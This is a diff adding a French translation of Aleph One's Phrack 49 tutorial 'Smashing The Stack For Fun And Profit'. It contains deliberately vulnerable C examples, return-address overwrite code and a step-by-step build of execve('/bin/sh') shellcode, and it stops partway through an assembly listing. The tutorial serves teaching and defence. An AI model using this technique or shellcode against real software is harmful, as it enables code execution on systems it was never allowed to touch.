@@ -1,0 +1,1597 @@
+Note de S/ash : cette traduction est loin d'ˆtre exempt de d‚faut.
+Notamment, j'ai eu du mal … traduire les expressions anglaise
+comme 'trash the stack' et d'autre. Je les ais donc laiss‚ avec une
+traduction approximative entre parenthŠses. Certaines expression
+peuvent paraŒtre maladroit voir difficile … comprendre. Si vous avez
+de meilleur traduction, merci de me pr‚venir : sl4sh@ifrance.com.
+
+                               .oO Phrack 49 Oo.
+
+                          Volume Seven, Issue Forty-Nine
+                                     
+                                  File 14 of 16
+
+                      BugTraq, r00t, and Underground.Org
+                                 vous pr‚sentent
+
+                     XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+                     Smashing The Stack For Fun And Profit
+                     XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+                                 par Aleph One
+                             aleph1@underground.org
+
+                             Traduit par S/ash [RtC]
+                                sl4sh@ifrance.com
+
+	`smash the stack` (fracasser la pile) [C programming] n. Sur
+        plusieurs impl‚mentation du C, il est possible de corrompre la 
+        pile d'‚x‚cution en ‚crivant au-del… de la fin d'un tableau
+        d‚clar‚ dans une fonction. Le code fait ce qui est dit dans la
+        partie du tableau qui a ‚t‚ ‚crite sur la pile et peut
+        provoquer un retour de fonction vers une adresse quelconque.
+        Cela peut produire les bugs les plus insidieux que l'hummanit‚
+        connaisse. Les autres termes sont 'trash the stack' (envoyer
+        la pile … la poubelle), 'scribble the stack' (gribouiller la
+        pile), 'mangle the stack' (mutiler la pile); le terme 'mung the
+        stack' n'est pas utilis‚ et tant donn‚ que cela n'est jamais fait
+        intentionellement. Voir 'spam'; voir ‚galement 'bug', 'fandango
+        on core', 'memory leak', 'precedence lossage', 'overrun screw'.
+
+
+                                 Introduction
+                                 ~~~~~~~~~~~~
+   Depuis quelques mois, de nombreuses failles sur le principe du buffer
+overflow ont ‚t‚es d‚couvertes et exploit‚. Syslog, splitvt, sendmail
+8.7.5, Linux/FreeBSD mount, Xt lib, at, etc en sont des exemples. Ce
+papier est l… pour essayer d'expliquer ce que sont les buffer overflows
+et comment leurs exploits fonctionnent.
+
+   Des bases en assembleur sont requisent. Une compr‚hension des concepts
+de m‚moire virtuel et de l'exp‚riende seront trŠs utiles mais pas n‚cessaire.
+Nous travailleront avec un CPU Intel x86 et un systŠme Linux.
+
+   Quelques d‚finitions de bases avant de commencer: un buffer est simplement
+un block continu de la m‚moire d'un ordinateur et contenant plusieurs donn‚es
+du mˆme type. Les programmeurs C associent normallement le mot buffer au mot
+tableau. TrŠs couramment, tableau de caractŠres. Les tableaux, comme toutes
+variables C, peuvent ˆtre aussi bien statique que dynamique. Les variables
+statiques sont allou‚es au chargement dans le segment de donn‚e. Les variables
+dynamiques sont, elles, allou‚es … l'‚x‚cution dans la pile. 'To Overflow'
+est innonder (flow), ou plut“t remplir par dessus, d‚passer ou encore 
+d‚border. Nous nous int‚resseront seulement au d‚bordement des buffers 
+dynamiques et autres connaissances sur les buffer overflows de pile.
+
+
+                     Organisation de la m‚moire des process
+                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+   Pour comprendre ce que sont les buffers de pile, nous devons avant tout
+commprendre comment un process organise la m‚moire. Les process sont divis‚s
+en trois zones : texte, donn‚es et pile. Nous allons nous concentr‚ sur la
+zone de la pile, mais d'abord, un court aper‡u des autres zones dans le mˆme
+ordre.
+
+   La zone de texte est fix‚e par le programme et contient le code
+(instructions) et donn‚es en lecture seule. Cette zone correspond … la section
+text de l'ex‚cutable. Elle est normallement en lecture seule et toute
+tentative d'‚crire dessus retournera une violation de segment (NDT : ceci est
+seulement sur de vrai systŠme comme Linux, en effet les systŠmes Microsoft
+laisse quiconque ‚crire sur la r‚gion de Texte).
+
+   La zone de donn‚e contient les donn‚es, initialis‚es ou non. Les variables
+statiques sont stock‚ dans cette zone. La zone de donn‚es correspond aux
+section data-bss de l'‚x‚cutable. Sa taille peut varier grƒce … l'apelle
+systŠme brk(2). Si l'extension de data-bss ou de la pile ‚puise la m‚moire
+disponible, le process sera arrˆt‚ et 'reprogramm‚' pour ˆtre relanc‚ …
+nouveau avec un espace m‚moire plus grand. De la m‚moire est rajout‚ entre
+le segment de donn‚es et celui de la pile.
+
+
+                             /------------------\  plus petites
+                             |                  |  adresses
+                             |      Texte       |  m‚moire
+                             |                  |
+                             |------------------|
+                             |  (Initialis‚es)  |
+                             |      Donn‚es     |
+                             |(non initialis‚es)|
+                             |------------------|
+                             |                  |
+                             |       Pile       |  plus grande
+                             |                  |  adresses
+                             \------------------/  m‚moire
+
+                         Fig. 1 Process Memory Regions
+
+
+                               Qu'est-ce qu'une pile ?
+                               ~~~~~~~~~~~~~~~~~~~~~~~
+
+   Une pile est un type de donn‚e abstrait souvent utilis‚e en informatique.
+Une pile d'objet se d‚finie par la propri‚t‚ que le dernier objet plac‚ sur
+la pile sera le premier retir‚. Cette propri‚t‚ est appel‚e une file LIFO
+(Last In, First Out).
+
+   Quelques op‚rations sont d‚finies sur les piles, les deux plus importantes
+‚tant PUSH et POP. PUSH ajout un ‚l‚ment en haut de la pile. POP, au 
+contraire, reduit la pile en retire le dernier ‚l‚ment mis en haut de la pile.
+
+
+                            Pourquoi utilisons-nous une pile ?
+                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+   Les ordinateurs modernes ont ‚t‚ con‡us pour le besoin en langages de
+haut niveau. La technique la plus importante pour stucturer un programme
+introduite dans les langages de haut niveau sont les proc‚dures et les
+fonctions. Un appel a une proc‚dure modifie le flux d'ex‚cution comme
+le fait un saut, mais, contrairement au saut, quand une proc‚dure a termin‚
+sa tache, elle doit retourn‚ … l'instruction suivant l'appel. Cette 
+abstraction est impl‚ment‚e avec l'aide d'une pile.
+
+  La pile est ‚galement utilis‚e pour allou‚e dynamiquement les variables
+locales utilis‚es dans des fonctions, pour passer des paramŠtres … celle-ci,
+et pour retourner des valeurs de celle-ci.
+
+
+                               La zone de la pile
+                               ~~~~~~~~~~~~~~~~~~
+
+   Une pile est un bloque continu du m‚moire contenant des donn‚es. Un 
+registre appel‚ le pointeur de pile (SP : stack pointer) pointe sur le haut 
+de la pile. Le bas de la pile ‚tant … une adresse fix‚e. Sa taille est
+ajust‚e dynamiquement … l'‚x‚cution par le noyau. Les instruction PUSH et POP
+sont impl‚ment‚ dans le processeur.
+
+   La pile est compos‚ de fenetres logiques qui sont "pouss‚es" quand une
+fonction est appel‚e et sorties au retour de la fonction. Une fenetre contient
+les paramŠtres de la fonction, ses variables locales, et les donn‚es
+n‚cessaires pour r‚cup‚r‚ la fenetre pr‚c‚dentes, y compris la valeur du
+pointeur de code (pointeur pointant sur l'instruction en cour) au momment de
+l'appel … la fonction.
+
+   Selon l'impl‚mentation la pile va s'‚tendre soit par le bas (vers les
+adresses de m‚moire plus faibles) soit par le haut. Dans nos exemples nous
+utiliseront une pile qui s'‚tend par le bas. C'est l'impl‚mentation la plus
+courante des piles (notamment celle des processeurs Intel, Motorola, SPARC et
+MIPS). Le pointeur de pile (SP) d‚pend ‚galement de l'impl‚mentation. Il peut
+pointer sur la derniŠre adresse de la pile ou sur la premiŠre adresse
+disponible aprŠs la pile. Pour cet article, nous considŠrerons qu'il pointe
+sur la derniŠre adresse de la pile.
+
+   En plus du pointer de pile, qui pointe sur le haut de la pile (la plus
+petite adresse num‚rique), il est souvent pratique d'avoir un pointeur de
+fenetre (FP : frame pointer) qui pointera vers une adresse li‚e … la fenetre.
+Certain textes peuvent ‚galement le nomm‚ pointeur de base locale (LB). En
+principe les variables locales peuvent etre r‚f‚renc‚es en donnant leur
+position par rapport … SP. Mais, comme des donn‚es sont pouss‚es et retir‚es
+de la pile, ce d‚placement change. Meme si, dans certain cas, le compilateur
+peut garder trace du nombre de mots dans la pile et corriger les offsets, il
+y a certain cas o— il ne peut pas le faire et dans tous ces cas une ‚norme
+gestion de SP est n‚cessaire. De plus, sur certaines machines, comme les
+machines … processeur Intel, acc‚der … une variable situ‚e … une distance
+connue de SP requiert plusieurs intructions.
+
+   Par cons‚quence, plusieur compilateurs utilisent un second registre, FP,
+pour r‚f‚rencer aussi bien les variables locales que les paramŠtres car la
+distance par rapport … FP ne change pas avec les PUSH et les POP. Sur les CPU
+Intel, BP (EBP) est utilis‚e dans ce but. Sur les processeur Motorola, tout
+registre d'adresse except‚ A7 (le pointeur de pile) peut servir … cela. A
+cause de la fa‡on dont est augment‚e la pile, les paramŠtres r‚els ont un
+offset positif et les variables locales un offset n‚gatif … partir de FP.
+
+   la premiŠre chose qu'une proc‚dure doit faire lorsqu'elle est appel‚e est
+de sauver le pr‚cedent FP (pour qu'il puisse etre restaur‚ … la sortie de la
+proc‚dure). AprŠs, elle copie SP dans FP pour cr‚er le nouveau FP, et avance
+SP pour r‚server de la place pour les variables locales. Ce code est appel‚
+le prologue de la proc‚dure. Lorsque la proc‚dure se termine, la pile doit
+etre nettoyer, il s'agit de l'‚pilogue de la proc‚dure. Les instructions
+Intel ENTER et LEAVE ou les instructions Motorola LINK et UNLINK r‚alise la
+plupart du travail … faire dans le prologue et dans l'‚pilogue.
+
+   Regardons de quoi a l'air la pile avec un exemple simple :
+
+example1.c:
+------------------------------------------------------------------------------
+void function(int a, int b, int c) {
+   char buffer1[5];
+   char buffer2[10];
+}
+
+void main() {
+  function(1,2,3);
+}
+------------------------------------------------------------------------------
+
+   Pour comprendre ce que le programme fait pour appeler function(), nous le
+compilerons en utilisant l'option -S de gcc pour g‚n‚rer une sortie
+assembleur:
+
+$ gcc -S -o example1.s example1.c
+
+   En regardant la sortie assembleur, nous voyons que l'appel … function() est
+traduit par :
+
+        pushl $3
+        pushl $2
+        pushl $1
+        call function
+
+   Cela met les 3 arguments de la fonction dans la pile, puis appelle
+function(). L'instruction 'call' va mettre le pointer de code (IP : 
+instruction pointer) dans la pile. Nous auront besoin du registre IP sauv‚
+pour l'adresse de retour (… l'instruction RET). La premiŠre chose faite dans
+la fonction est le prologue :
+
+        pushl %ebp
+        movl %esp,%ebp
+        subl $20,%esp
+
+   Ce code met EBP dans la pile et le pointeur de fenetre. Puis il copie le
+SP courant dans EBP, construisant le nouveau FP. Nous appellerons le FP
+sauvegarder SFP. Et enfin, il alloue de la place pour les variables locales
+en soustrayant la taille totale des variables … SP.
+
+   Nous devons nous rappeler que la m‚moire peut seulement etre adress‚e par
+un multiple de la taille des mots (NDT : 16 bits sur un systŠme 16-bits,
+32-bits sur un systŠme 32-bits). Dans notre cas un mots fait 4 octets soit 32
+bits. Donc notre buffer de 5 octets va en prendre en r‚alit‚ 8 octets (2
+mots) et celui de 10 octets prendra 12 octets (3 mots) en m‚moire. C'est
+pourquoi SP est soustrait de 20. En gardant ceci … l'esprit, notre pile 
+ressemblera, quand function() aura ‚t‚ apel‚e, … (chaque espace repr‚sente un
+octet) : 
+
+
+bas de la                                                            haut de
+m‚moire                                                            la m‚moire
+           buffer2       buffer1   sfp   ret   a     b     c
+<------   [            ][        ][    ][    ][    ][    ][    ]
+
+bas de la                                                          haut de la
+pile                                                                     pile
+
+                               Buffer Overflows
+                               ~~~~~~~~~~~~~~~~
+
+   Un buffer overflow (d‚passement de tampon) est le r‚sultat d'une tentative
+de mettre plus de donn‚es qu'un buffer peut contenir. Comment cet erreur de
+programmation courante peut-etre d‚tourn‚ pour ex‚cuter un code arbitraire ?
+Regardons un autre exemple :
+
+example2.c
+------------------------------------------------------------------------------
+void function(char *str) {
+   char buffer[16];
+
+   strcpy(buffer,str);
+}
+
+void main() {
+  char large_string[256];
+  int i;
+
+  for( i = 0; i < 255; i++)
+    large_string[i] = 'A';
+
+  function(large_string);
+}
+------------------------------------------------------------------------------
+
+   Il s'agit d'un programme contenant une erreur de buffer overflow typique.
+La fonction copie une chaine donn‚es sans v‚rifier sa taille en utilisant
+strcpy() au lieu de strncpy(). Si vous lancez ce programme, vous obtiendrez
+un segmentation violation. Regardons de quoi la pile … l'air quand nous
+appelons la fonction:
+
+
+bas de la                                                            haut de
+m‚moire                                                            la m‚moire
+                  buffer            sfp   ret   *str
+<------          [                ][    ][    ][    ]
+
+bas de la                                                          haut de la
+pile                                                                     pile
+
+   Qu'est-ce qui ce passe ? Pourquoi obtenons nous un segmentation violation ?
+C'est simple. strcpy() copie le contenu de *str (larger_string[]) dans
+buffer[] jusqu'… ce qu'un caractŠre null ('\0') soit trouv‚ dans la chaine.
+Comme nous pouvons le voir, buffer[] est plus petit que *str. buffer[] fait
+16 octets et nous essayons d'y placer 256 octets. Cela veut dire que les 250
+octets suivants le buffer dans la pile seront r‚‚crit. Incluant SFP, RET, et
+meme *str ! Nous avons remplit  large_string avec le caractŠre 'A' dont la
+valeur h‚xad‚cimale est 0x41. Cela signifie que l'adresse de retour sera
+d‚sormais 0x41414141. C'est hors de l'espace m‚moire du processus. C'est
+pourquoi, alors la fonction finie et essaie de lire l'instruction … cette
+adresse, vous obtenez un segmentation violation.
+
+   Donc un buffer overflow nous autorise … changer l'adresse de retour d'une
+fonction. Par ce moyen nous pouvons changer le cour de l'ex‚cution normale
+d'un programme. Revenons … notre premier exemple et rappelons nous que la pile
+ressemblait … :
+
+
+bas de la                                                            haut de
+m‚moire                                                            la m‚moire
+           buffer2       buffer1   sfp   ret   a     b     c
+<------   [            ][        ][    ][    ][    ][    ][    ]
+
+bas de la                                                          haut de la
+pile                                                                     pile
+
+
+   Modifions notre premier exemple pour qu'il r‚‚crive l'adresse de retour,
+et voyons comment nous pouvons ex‚cuter un code arbitraire. Juste avant
+buffer1[] il y a, dans la pile, SFP et, encore avant, l'adresse de retour.
+Soit 4 octets aprŠs la fin de buffer1[]. Mais rappelons-nous que buffer1[]
+fait en r‚alit‚ 2 mots soit 8 octets. Donc l'adresse de retour est … 12
+octets du d‚but de buffer1[]. Nous allons modifier la valeur de retour de tel
+maniŠre que l'instruction 'x = 1;' aprŠs l'appel … la fonction sera saut‚.
+Pour ce faire, nous ajoutons 8 … l'adresse de retour. Notre code est
+d‚sormais :
+
+example3.c:
+------------------------------------------------------------------------------
+void function(int a, int b, int c) {
+   char buffer1[5];
+   char buffer2[10];
+   int *ret;
+
+   ret = buffer1 + 12;
+   (*ret) += 8;
+}
+
+void main() {
+  int x;
+
+  x = 0;
+  function(1,2,3);
+  x = 1;
+  printf("%d\n",x);
+}
+------------------------------------------------------------------------------
+
+   Nous avons ajout‚ 12 … l'adresse de buffer1[]. Cette nouvelle adressse est
+l'emplacement de l'adresse de retour. Nous voulons "sauter" l'assignement pour
+arriver … l'appel … printf. Comment avons-nous su qu'il fallait ajouter 8 …
+l'adresse de retour ? Nous avons d'abord utilis‚ une valeur de test (pour
+l'exemple 1), compil‚ le programme et lanc‚ gdb :
+
+------------------------------------------------------------------------------
+[aleph1]$ gdb example3
+GDB is free software and you are welcome to distribute copies of it
+under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
+(no debugging symbols found)...
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x8000490 <main>:       pushl  %ebp
+0x8000491 <main+1>:     movl   %esp,%ebp
+0x8000493 <main+3>:     subl   $0x4,%esp
+0x8000496 <main+6>:     movl   $0x0,0xfffffffc(%ebp)
+0x800049d <main+13>:    pushl  $0x3
+0x800049f <main+15>:    pushl  $0x2
+0x80004a1 <main+17>:    pushl  $0x1
+0x80004a3 <main+19>:    call   0x8000470 <function>
+0x80004a8 <main+24>:    addl   $0xc,%esp
+0x80004ab <main+27>:    movl   $0x1,0xfffffffc(%ebp)
+0x80004b2 <main+34>:    movl   0xfffffffc(%ebp),%eax
+0x80004b5 <main+37>:    pushl  %eax
+0x80004b6 <main+38>:    pushl  $0x80004f8
+0x80004bb <main+43>:    call   0x8000378 <printf>
+0x80004c0 <main+48>:    addl   $0x8,%esp
+0x80004c3 <main+51>:    movl   %ebp,%esp
+0x80004c5 <main+53>:    popl   %ebp
+0x80004c6 <main+54>:    ret
+0x80004c7 <main+55>:    nop
+------------------------------------------------------------------------------
+
+   Nous pouvons voir qu'en appelant function() l'adresse de retour sera
+0x8004a8, et que nous voulons aller aprŠs l'assignement … 0x80004ab.
+L'instruction que nous voulons ‚x‚cuter est … l'adresse 0x8004b2. Un petit
+peu de math nous dit que la distance … ajouter est 8 octets.
+
+
+                                  Shell Code
+                                  ~~~~~~~~~~
+
+   A pr‚sent que nous savons que nous pouvons modifier l'adresse de retour
+et le cour de l'ex‚cution, quel programme voulons-nous ex‚cuter ? Dans la
+plupart des cas, nous voulons simplement que le programme renvoie un shell.
+A partir du shell, nous pouvons lancer les commandes que nous voulons. Mais
+comment faire s'il n'y a pas de code qui lance un shell dans le programme que
+nous essayons d'exploiter ? Comment mettre une instruction arbitraire dans 
+l'espace m‚moire du programme ? La solution est de mettre le code que nous
+voulons ‚x‚cuter dans le buffer que nous voulons faire d‚border, et de
+r‚‚crire l'adresse de retour pour qu'elle pointe dans le buffer. Consid‚rons
+que la pile commence … l'adresse 0xFF, et que S repr‚sente le code que nous 
+voulons ex‚cuter, alors la pile ressemblera … :
+
+bas de la  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF      haut de la
+m‚moire    89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF         m‚moire
+           buffer                sfp   ret   a     b     c
+
+<------   [SSSSSSSSSSSSSSSSSSSS][SSSS][0xD8][0x01][0x02][0x03]
+           ^                            |
+           |____________________________|
+bas de la                                                          haut de la
+pile                                                                     pile 
+
+
+Le code pour lancer un shell en C ressemble … :
+
+shellcode.c
+-----------------------------------------------------------------------------
+#include <stdio.h>
+
+void main() {
+   char *name[2];
+
+   name[0] = "/bin/sh";
+   name[1] = NULL;
+   execve(name[0], name, NULL);
+}
+------------------------------------------------------------------------------
+
+   Pour voir … quoi cela ressemble en assembleur nous le compilons et
+d‚marrons gdb. N'oubliez pas d'utiliser l'option -static. Sinon le code pour
+l'appel systŠme … execve ne sera pas inclu : il y aura … la place une
+r‚f‚rence vers la libc qui est normallement li‚e au chargement.
+
+------------------------------------------------------------------------------
+[aleph1]$ gcc -o shellcode -ggdb -static shellcode.c
+[aleph1]$ gdb shellcode
+GDB is free software and you are welcome to distribute copies of it
+under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x8000130 <main>:       pushl  %ebp
+0x8000131 <main+1>:     movl   %esp,%ebp
+0x8000133 <main+3>:     subl   $0x8,%esp
+0x8000136 <main+6>:     movl   $0x80027b8,0xfffffff8(%ebp)
+0x800013d <main+13>:    movl   $0x0,0xfffffffc(%ebp)
+0x8000144 <main+20>:    pushl  $0x0
+0x8000146 <main+22>:    leal   0xfffffff8(%ebp),%eax
+0x8000149 <main+25>:    pushl  %eax
+0x800014a <main+26>:    movl   0xfffffff8(%ebp),%eax
+0x800014d <main+29>:    pushl  %eax
+0x800014e <main+30>:    call   0x80002bc <__execve>
+0x8000153 <main+35>:    addl   $0xc,%esp
+0x8000156 <main+38>:    movl   %ebp,%esp
+0x8000158 <main+40>:    popl   %ebp
+0x8000159 <main+41>:    ret
+End of assembler dump.
+(gdb) disassemble __execve
+Dump of assembler code for function __execve:
+0x80002bc <__execve>:   pushl  %ebp
+0x80002bd <__execve+1>: movl   %esp,%ebp
+0x80002bf <__execve+3>: pushl  %ebx
+0x80002c0 <__execve+4>: movl   $0xb,%eax
+0x80002c5 <__execve+9>: movl   0x8(%ebp),%ebx
+0x80002c8 <__execve+12>:        movl   0xc(%ebp),%ecx
+0x80002cb <__execve+15>:        movl   0x10(%ebp),%edx
+0x80002ce <__execve+18>:        int    $0x80
+0x80002d0 <__execve+20>:        movl   %eax,%edx
+0x80002d2 <__execve+22>:        testl  %edx,%edx
+0x80002d4 <__execve+24>:        jnl    0x80002e6 <__execve+42>
+0x80002d6 <__execve+26>:        negl   %edx
+0x80002d8 <__execve+28>:        pushl  %edx
+0x80002d9 <__execve+29>:        call   0x8001a34 <__normal_errno_location>
+0x80002de <__execve+34>:        popl   %edx
+0x80002df <__execve+35>:        movl   %edx,(%eax)
+0x80002e1 <__execve+37>:        movl   $0xffffffff,%eax
+0x80002e6 <__execve+42>:        popl   %ebx
+0x80002e7 <__execve+43>:        movl   %ebp,%esp
+0x80002e9 <__execve+45>:        popl   %ebp
+0x80002ea <__execve+46>:        ret
+0x80002eb <__execve+47>:        nop
+End of assembler dump.
+------------------------------------------------------------------------------
+
+Essayons de comprendre ce qui ce passe dans ce code. Commen‡ons par ‚tudier
+main :
+
+------------------------------------------------------------------------------
+0x8000130 <main>:       pushl  %ebp
+0x8000131 <main+1>:     movl   %esp,%ebp
+0x8000133 <main+3>:     subl   $0x8,%esp
+
+	C'est le pr‚lude de la proc‚dure. Tout d'abord, l'ancien pointeur de
+	fenetre est sauv‚ puis le nouveau est construit … partir du pointeur
+	de pile et enfin de la m‚moire est laiss‚e pour les variables locales.
+	Ici c'est :
+
+	char *name[2];
+
+	soit 2 pointeurs vers une donn‚e de type char. Les pointeurs font un
+	mot de longueur, donc 2 mots de m‚moire sont r‚serv‚s dans la pile
+	(8 octets).
+
+0x8000136 <main+6>:     movl   $0x80027b8,0xfffffff8(%ebp)
+
+	Nous copions la valeur 0x80027b8 (l'adresse de la chaine "/bin/sh")
+	dans le premier pointeur, name[0]. C'est ‚quivalent … :
+
+	name[0] = "/bin/sh";
+
+0x800013d <main+13>:    movl   $0x0,0xfffffffc(%ebp)
+
+	Nous copions la valeur 0x0 (NULL) dans le second pointeur, name[1].
+	C'est ‚quivalent … :
+
+	name[1] = NULL;
+
+	Le v‚ritable appel … execve() commence ici.
+
+0x8000144 <main+20>:    pushl  $0x0
+
+	Les arguments de execve() sont pouss‚s dans la pile selon l'ordre 
+	inverse, en commen‡ant par NULL.
+
+0x8000146 <main+22>:    leal   0xfffffff8(%ebp),%eax
+
+	L'adresse de name[] est charg‚ dans le registre EAX
+
+0x8000149 <main+25>:    pushl  %eax
+
+	L'adresse de name[] est pouss‚e dans la pile.
+
+0x800014a <main+26>:    movl   0xfffffff8(%ebp),%eax
+
+	L'adresse de la chaine "/bin/sh" est mise dans le registre EAX.
+
+0x800014d <main+29>:    pushl  %eax
+
+	Nous poussons l'adresse de la chaine "/bin/sh" dans la pile.
+
+0x800014e <main+30>:    call   0x80002bc <__execve>
+
+	Appelle la procedure execve(). L'instruction call pousse IP dans la
+	pile
+------------------------------------------------------------------------------
+
+   Passons d‚sormais … execve(). Gardons … l'esprit que nous utilisons un
+systŠme Linux avec processeur Intel. Les d‚tails des appels systŠme change
+selon l'OS et le CPU. Certains passent les arguments sur la pile, d'autres
+dans les registres. Certains utilisent une interruption logiciel pour passer
+en mode noyau, d'autres utilisent un far call. Linux passe ces arguments du
+call dans les registres et utilisent une interruption logiciel pour passer la
+main au noyau.
+
+------------------------------------------------------------------------------
+0x80002bc <__execve>:   pushl  %ebp
+0x80002bd <__execve+1>: movl   %esp,%ebp
+0x80002bf <__execve+3>: pushl  %ebx
+
+	Le pr‚lude
+
+0x80002c0 <__execve+4>: movl   $0xb,%eax
+
+	Copie 0xb (11 en d‚cimal) sur la pile, il s'agit d'un index de la
+	table d'appel systŠme. 11 est celui de execve.
+
+0x80002c5 <__execve+9>: movl   0x8(%ebp),%ebx
+
+	Copie l'adresse de "/bin/sh" dans EBX.
+
+0x80002c8 <__execve+12>:        movl   0xc(%ebp),%ecx
+
+	Copie l'adresse de name[] dans ECX.
+
+0x80002cb <__execve+15>:        movl   0x10(%ebp),%edx
+
+	Copie l'adresse du pointeur nul dans %edx.
+
+0x80002ce <__execve+18>:        int    $0x80
+
+	Passe la main au noyau.
+------------------------------------------------------------------------------
+
+Donc, comme nous pouvons le voir, il n'y en pas de trop pour l'appel systŠme …
+execve(). Tout ce que nous avons besoin de faire est :
+
+	a) Avoir la chaine "/bin/sh" (termin‚e par un caractŠre nul) quelque 
+	   part en m‚moire.
+	b) avoir l'adresse de la chaine "/bin/sh" en m‚moire suivit d'un mots
+	   nul. 
+	c) Copier 0xb dans le registre EAX.
+	d) Copier l'adresse de l'adresse de la chaine "/bin/sh" dans le
+	   registre EBX.
+	e) Copier l'adresse de la chaine "/bin/sh" dans le registre ECX.
+	f) Copier l'adresse du mot nul dans EDX.
+	g) Ex‚cuter l'instruction int $0x80.
+
+   Qu'en est-il du cas o— l'appel … execve() echoue pour une raison
+quelconque? Le program va continuer … aller chercher des instructions dans la
+pile qui peut contenir des donn‚es al‚atoire ! Le programmes plantera
+surement avec un joli core dump. Nous voulons que le programme quitte 
+tranquilement si l'appel … execve ‚choue. Pour cela, nous devons ajouter un
+appel systŠme … exit aprŠs celui de execve. A quoi ressemble l'appel systŠme 
+… exit ?
+
+exit.c
+------------------------------------------------------------------------------
+#include <stdlib.h>
+
+void main() {
+        exit(0);
+}
+------------------------------------------------------------------------------
+
+------------------------------------------------------------------------------
+[aleph1]$ gcc -o exit -static exit.c
+[aleph1]$ gdb exit
+GDB is free software and you are welcome to distribute copies of it
+under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
+(no debugging symbols found)...
+(gdb) disassemble _exit
+Dump of assembler code for function _exit:
+0x800034c <_exit>:      pushl  %ebp
+0x800034d <_exit+1>:    movl   %esp,%ebp
+0x800034f <_exit+3>:    pushl  %ebx
+0x8000350 <_exit+4>:    movl   $0x1,%eax
+0x8000355 <_exit+9>:    movl   0x8(%ebp),%ebx
+0x8000358 <_exit+12>:   int    $0x80
+0x800035a <_exit+14>:   movl   0xfffffffc(%ebp),%ebx
+0x800035d <_exit+17>:   movl   %ebp,%esp
+0x800035f <_exit+19>:   popl   %ebp
+0x8000360 <_exit+20>:   ret
+0x8000361 <_exit+21>:   nop
+0x8000362 <_exit+22>:   nop
+0x8000363 <_exit+23>:   nop
+End of assembler dump.
+------------------------------------------------------------------------------
+
+   L'appel systŠme exit() place 0x1 dans EAX, le code de sortie dans EBX puis
+ex‚cute "int 0x80". La plupart des applications retournent 0 … la sortie
+pour indiquer "pas d'erreur". Nous placerons donc 0 dans EBX. Notre liste
+d'‚tapes est maintenant :
+
+	a) Avoir la chaine "/bin/sh" (termin‚e par un caractŠre nul) quelque 
+	   part en m‚moire.
+	b) avoir l'adresse de la chaine "/bin/sh" en m‚moire suivit d'un mots
+	   nul. 
+	c) Copier 0xb dans le registre EAX.
+	d) Copier l'adresse de l'adresse de la chaine "/bin/sh" dans le
+	   registre EBX.
+	e) Copier l'adresse de la chaine "/bin/sh" dans le registre ECX.
+	f) Copier l'adresse du mot nul dans EDX.
+	g) Ex‚cuter l'instruction int $0x80.
+	h) Copier 0x1 dans le registre EAX.
+	i) Copier 0x0 dans le registre EBX.
+	j) Ex‚cuter l'instruction int $0x80.
+
+   Essayons de mettre tout ‡a essemble en langage assembleur, en pla‡ant la
+chaine aprŠs le code, et en nous rappelant que nous devrons mettre l'adresse
+de la chaine et un mot null aprŠs le tableau. Nous obtenons:
+
+------------------------------------------------------------------------------
+        movl   string_addr,string_addr_addr
+	movb   $0x0,null_byte_addr
+        movl   $0x0,null_addr
+        movl   $0xb,%eax
+        movl   string_addr,%ebx
+        leal   string_addr,%ecx
+        leal   null_string,%edx
+        int    $0x80
+        movl   $0x1, %eax
+        movl   $0x0, %ebx
+	int    $0x80
+	La chaine /bin/sh vient ici
+------------------------------------------------------------------------------
+
+   Le problŠme est que nous ne connaissons pas o—, dans l'espace m‚moire,
+le programme dont nous essayons d'exploiter le code (et la chaine) sera
+plac‚. Un moyen de contourner ce problŠme est d'utiliser un JMP puis un CALL.
+Les instructions JMP et CALL peuvent utiliser l'adressage relatif … IP, ce qui
+veut dire que nous pouvons nous d‚placer d'un offset … partir du IP courant
+sans avoir besoin de connaitre l'adresse exacte de la m‚moire o— nous voulons
+aller. Si nous placons une instruction CALL juste avant la chaine "/bin/sh",
+et une instruction JMP vers celle-ci, l'adresse de la chaine sera pouss‚ dans
+la pile comme adresse de retour quand le CALL sera ex‚cut‚. Tout ce que nous
+avons besoin de faire est de copier l'adresse de retour dans un registre.
+L'instruction CALL peut appeler simplement le d‚but du code pr‚c‚dent.
+Consid‚rons d‚sormais que J est l… pour l'instruction JMP, C pour
+l'instruction CALL, et s pour la chaine, alors le flux d'ex‚cution sera :
+
+
+bas de la  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF      haut de la
+m‚moire    89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF         m‚moire
+           buffer                sfp   ret   a     b     c
+
+<------   [JJSSSSSSSSSSSSSSCCss][ssss][0xD8][0x01][0x02][0x03]
+           ^|^             ^|            |
+           |||_____________||____________| (1)
+       (2)  ||_____________||
+             |______________| (3)
+bas de la                                                          haut de la
+pile                                                                     pile 
+
+
+
+   Avec ces modifications, en utilisant un adressage index‚, et en ‚crivant
+la taille en octet de chaque instruction, notre code ressemble … :
+
+------------------------------------------------------------------------------
+        jmp    offset-to-call           # 2 octets
+        popl   %esi                     # 1 octet
+        movl   %esi,array-offset(%esi)  # 3 octets
+        movb   $0x0,nullbyteoffset(%esi)# 4 octets
+        movl   $0x0,null-offset(%esi)   # 7 octets
+        movl   $0xb,%eax                # 5 octets
+        movl   %esi,%ebx                # 2 octets
+        leal   array-offset,(%esi),%ecx # 3 octets
+        leal   null-offset(%esi),%edx   # 3 octets
+        int    $0x80                    # 2 octets
+        movl   $0x1, %eax		# 5 octets
+        movl   $0x0, %ebx		# 5 octets
